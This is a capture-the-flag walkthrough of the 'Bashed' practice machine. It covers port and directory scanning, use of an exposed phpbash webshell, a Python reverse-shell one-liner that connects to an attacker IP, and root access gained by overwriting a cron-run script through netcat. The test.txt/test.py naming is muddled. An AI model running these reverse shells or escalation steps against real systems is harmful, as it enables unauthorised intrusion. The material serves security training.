# nmap

Enumerating the  target with nmap,
```
nmap -Pn -A  -p-20000 -sS --vv 10.129.185.253 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 10:15 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:15
Completed Parallel DNS resolution of 1 host. at 10:15, 0.08s elapsed
Initiating SYN Stealth Scan at 10:15
Scanning 10.129.185.253 [20000 ports]
Discovered open port 80/tcp on 10.129.185.253
Increasing send delay for 10.129.185.253 from 0 to 5 due to 655 out of 2182 dropped probes since last increase.
SYN Stealth Scan Timing: About 12.25% done; ETC: 10:20 (0:03:42 remaining)
SYN Stealth Scan Timing: About 14.76% done; ETC: 10:22 (0:05:52 remaining)
SYN Stealth Scan Timing: About 17.09% done; ETC: 10:24 (0:07:21 remaining)
SYN Stealth Scan Timing: About 24.37% done; ETC: 10:24 (0:06:16 remaining)
SYN Stealth Scan Timing: About 31.32% done; ETC: 10:23 (0:05:31 remaining)
SYN Stealth Scan Timing: About 39.35% done; ETC: 10:24 (0:05:07 remaining)
SYN Stealth Scan Timing: About 45.58% done; ETC: 10:24 (0:04:33 remaining)
SYN Stealth Scan Timing: About 51.47% done; ETC: 10:24 (0:04:07 remaining)
SYN Stealth Scan Timing: About 57.65% done; ETC: 10:24 (0:03:34 remaining)
SYN Stealth Scan Timing: About 66.27% done; ETC: 10:25 (0:03:07 remaining)
SYN Stealth Scan Timing: About 71.75% done; ETC: 10:25 (0:02:37 remaining)
SYN Stealth Scan Timing: About 77.23% done; ETC: 10:25 (0:02:09 remaining)
SYN Stealth Scan Timing: About 82.91% done; ETC: 10:25 (0:01:37 remaining)
SYN Stealth Scan Timing: About 90.85% done; ETC: 10:25 (0:00:51 remaining)
Completed SYN Stealth Scan at 10:25, 552.08s elapsed (20000 total ports)
Initiating Service scan at 10:25
Scanning 1 service on 10.129.185.253
Completed Service scan at 10:25, 6.62s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.185.253
Retrying OS detection (try #2) against 10.129.185.253
Retrying OS detection (try #3) against 10.129.185.253
Retrying OS detection (try #4) against 10.129.185.253
Retrying OS detection (try #5) against 10.129.185.253
Initiating Traceroute at 10:25
Completed Traceroute at 10:25, 0.62s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:25
Completed Parallel DNS resolution of 2 hosts. at 10:25, 0.06s elapsed
NSE: Script scanning 10.129.185.253.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 8.51s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 1.26s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 0.00s elapsed
Nmap scan report for 10.129.185.253
Host is up, received user-set (0.31s latency).
Scanned at 2021-08-13 10:15:52 IST for 593s
Not shown: 19999 closed ports
Reason: 19999 resets
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/13%OT=80%CT=1%CU=43593%PV=Y%DS=2%DC=T%G=Y%TM=6115FB5
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 0.004 days (since Fri Aug 13 10:19:51 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   602.10 ms 10.10.16.1
2   351.23 ms 10.129.185.253

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:25
Completed NSE at 10:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 596.76 seconds
           Raw packets sent: 22568 (997.042KB) | Rcvd: 27287 (2.333MB)
```
we got the http service up and running on the port 80.

so,lets go that webpage and we find a utility called [phpbash](https://github.com/Arrexel/phpbash#:~:text=phpbash%20is%20a%20standalone%2C%20semi,should%20feel%20right%20at%20home.)

# gobuster

```
gobuster dir -u http://10.129.185.253 -w /usr/share/dirb/wordlists/common.txt -e -n 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.185.253
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/13 11:16:47 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.185.253/.hta                 [Size: 293]
http://10.129.185.253/.htpasswd            [Size: 298]
http://10.129.185.253/.htaccess            [Size: 298]
http://10.129.185.253/css                  [Size: 314] [--> http://10.129.185.253/css/]
http://10.129.185.253/dev                  [Size: 314] [--> http://10.129.185.253/dev/]
http://10.129.185.253/fonts                [Size: 316] [--> http://10.129.185.253/fonts/]
http://10.129.185.253/images               [Size: 317] [--> http://10.129.185.253/images/]
http://10.129.185.253/index.html           [Size: 7743]                                   
http://10.129.185.253/js                   [Size: 313] [--> http://10.129.185.253/js/]    
http://10.129.185.253/php                  [Size: 314] [--> http://10.129.185.253/php/]   
http://10.129.185.253/server-status        [Size: 302]                                    
http://10.129.185.253/uploads              [Size: 318] [--> http://10.129.185.253/uploads/]
                                                                                           
===============================================================
2021/08/13 11:18:45 Finished
===============================================================
```
I looked at the dev directory and found two interesting php files.
I navigated to phpbash.php and interestingly got a semi-interactive webshell.

![webshell](/Images/webshell-bashed.PNG)

I grabbed a reverse shell python code and made changes to the ip and port number and set up a netcat listener on my machine,executed the code  on the webshell we found to get a reverse back on our attack machine

>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

after getting the reverse shell i spawned the shell using

>python -c 'import pty;pty.spawn("/bin/bash")'

![shell](/Images/reverse-shell-bashed.PNG)

after that I checked the file permissions in the root directory and found this interesting

```
drwxrwxr--   2 scriptmanager scriptmanager  4096 Aug 13 23:04 scripts
```
I ran sudo -l to check whether we can run any escalated services without the need of a password

```
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

so its time to switch the user to scriptmanager

>sudo -u scriptmanager /bin/bash

```
whoami
scriptmanager
```
we get two files. after observing the last modification dates we can guess that the test.txt is a cronjob which is executed by root.

so I created a similar python file test.py and put the python code for a reverse shell  [code](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)  and transferred (overwrote the test.py in the machine) using netcat

on the target machine
>nc -l -p port(8888) > test.py

on attacker machine
>cat  test.py | nc ip-of-target-machine port(8888)

I set up a listener on port 8888 on my machine and got the reverse shell this time as root('cause test.txt is owned by root)

![root](/Images/root-bashed.PNG)
